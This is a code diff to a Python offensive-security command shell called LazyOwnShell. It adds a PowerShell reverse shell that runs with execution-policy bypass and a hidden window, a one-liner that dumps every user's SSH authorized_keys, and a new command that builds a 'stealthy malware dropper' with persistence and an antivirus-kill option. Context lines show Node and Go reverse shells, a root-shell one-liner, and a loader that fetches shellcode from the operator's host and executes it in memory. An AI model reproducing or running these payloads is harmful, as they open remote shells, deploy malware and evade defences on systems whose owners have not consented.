@@ -86,6 +86,7 @@ class LazyOwnShell(Cmd):
         "nmap": "run lazynmap",
         "now": "clock",
         "p": "payload",
+        "pass": "sh head -c 100 /dev/urandom | base64 | head -c 12 | xclip -sel clip",
         "poison": "run lazylogpoisoning",
         "powersploit":"sh powersploit -h",
         "pwnat": "sh pwnat -s 8080",
@@ -4818,6 +4819,8 @@ class LazyOwnShell(Cmd):
             ("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
             ("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
             ("find .kdb files", "find / -type f -name *.kdb 2>/dev/null"),
+            ("ls", "ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'"),
+            ("autorized keys", "cat /etc/passwd | grep -Ev \"^#\" | cut -d: -f6 | xargs -I {} sh -c 'file={}/.ssh/authorized_keys; if [ -f $file ]; then echo -n {} && echo \":\" && cat $file | grep . && echo; fi'"),
             ("Timers", "systemctl list-timers"),
             ("python", "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"),
             ("python shellcode.bin", f'python3 -c "import base64, ctypes, urllib.request; url = \'http://{lhost}/shellcode.bin\'; response = urllib.request.urlopen(url); shellcode = base64.b64decode(response.read()); shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode)); shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p)); shellcode_func()"'),
@@ -11328,7 +11331,7 @@ class LazyOwnShell(Cmd):
         """
         Generate a reverse shell in various programming languages.
         
-        This function prompts the user to choose a reverse shell type (Bash, Python, NetCat, PHP, Ruby, Perl, or Telnet) 
+        This function prompts the user to choose a reverse shell type (Bash, Python, NetCat, PHP, Ruby, Perl, Telnet, NodeJS, Golang, PowerShell) 
         and then asks for the necessary parameters (IP and port). Based on the user's input, it generates the corresponding 
         reverse shell command.
         
@@ -11344,16 +11347,17 @@ class LazyOwnShell(Cmd):
             "6": "Perl",
             "7": "Telnet",
             "8": "NodeJS",
-            "9": "Golang"
+            "9": "Golang",
+            "10": "PowerShell"
         }
 
         print_msg("Choose the type of reverse shell to generate:")
         for key, value in shell_options.items():
             print_msg(f"{key}. {value}")
         
-        choice = input("    [!] Enter your choice (1-9): ").strip()
+        choice = input("    [!] Enter your choice (1-10): ").strip()
         if choice not in shell_options:
-            print_error("Invalid choice. Please enter a number between 1 and 9.")
+            print_error("Invalid choice. Please enter a number between 1 and 10.")
             return
         lhost = self.params["lhost"]
         lport = self.params["lport"]
@@ -11378,7 +11382,8 @@ class LazyOwnShell(Cmd):
             command = f"node -e 'var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect({port}, \"{ip}\", function(){{ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }});'"
         elif choice == "9":
             command = f'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'
-
+        elif choice == "10":
+            command = f"Start-Process $PSHOME\\powershell.exe -ArgumentList {{-ep bypass -nop $client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()}} -WindowStyle Hidden"
         else:
             print_error("Invalid selection.")
             return
@@ -11386,6 +11391,7 @@ class LazyOwnShell(Cmd):
         print_msg(f"Generated {shell_options[choice]} Reverse Shell:\n{command}")
         copy2clip(command)
         return
+
 
     def do_alterx(self, line):
         """
@@ -11527,6 +11533,69 @@ class LazyOwnShell(Cmd):
         print_msg(f"Generated command: {command}")
         os.system(command)
         return
+
+    def do_dr0p1t(self, line):
+        """
+        Execute the Dr0p1t tool to create a stealthy malware dropper.
+
+        This function prompts the user to input the necessary parameters for 
+        generating a dropper, including the malware URL, persistence options, 
+        and additional configurations. Based on the user's input, it constructs 
+        the command and executes it.
+
+        :param line: Not used in this implementation.
+        :returns: None
+        """
+        if not is_binary_present("Dr0p1t.py"):
+            print_warn("Dr0p1t.py not found. Installing...")
+            command = "cd && git clone https://github.com/D4Vinci/Dr0p1t-Framework.git && cd Dr0p1t-Framework && chmod +x install.sh && ./install.sh"
+            os.system(command)
+        lhost = self.params["lhost"]
+        malware_url = input("    [!] Enter the malware URL (e.g., https://example.com/malware.exe): ").strip() or f"http://{lhost}/shell.elf"
+        if not malware_url:
+            print_error("Malware URL is required.")
+            return
+
+        persistence_options = {
+            "1": "--runas",
+            "2": "-s",
+            "3": "-t",
+            "4": "-a"
+        }
+
+        print_msg("Choose persistence options for the dropper:")
+        for key, value in persistence_options.items():
+            print_msg(f"{key}. {value}")
+
+        choice = input("    [!] Enter your choice (1-4, or leave blank for none): ").strip()
+        persistence_command = ""
+        if choice in persistence_options:
+            persistence_command = persistence_options[choice]
+
+        kill_av = input("    [!] Kill antivirus before execution? (y/n, default: n): ").strip().lower() or 'n'
+        if kill_av == 'y':
+            kill_av_command = "-k"
+        else:
+            kill_av_command = ""
+
+        run_script = input("    [!] Run a batch script before running the malware (optional): ").strip()
+        if run_script:
+            run_script_command = f"-b {run_script}"
+        else:
+            run_script_command = ""
+
+        icon = input("    [!] Use an icon for the final file (optional, path to icon): ").strip()
+        if icon:
+            icon_command = f"-i {icon}"
+        else:
+            icon_command = ""
+
+        command = f"cd && cd Dr0p1t-Framework && python3 Dr0p1t.py {malware_url} {persistence_command} {kill_av_command} {run_script_command} {icon_command}".strip()
+        
+        print_msg(f"Generated command: {command}")
+        os.system(command)
+        return
+
 
 if __name__ == "__main__":
     p = LazyOwnShell()
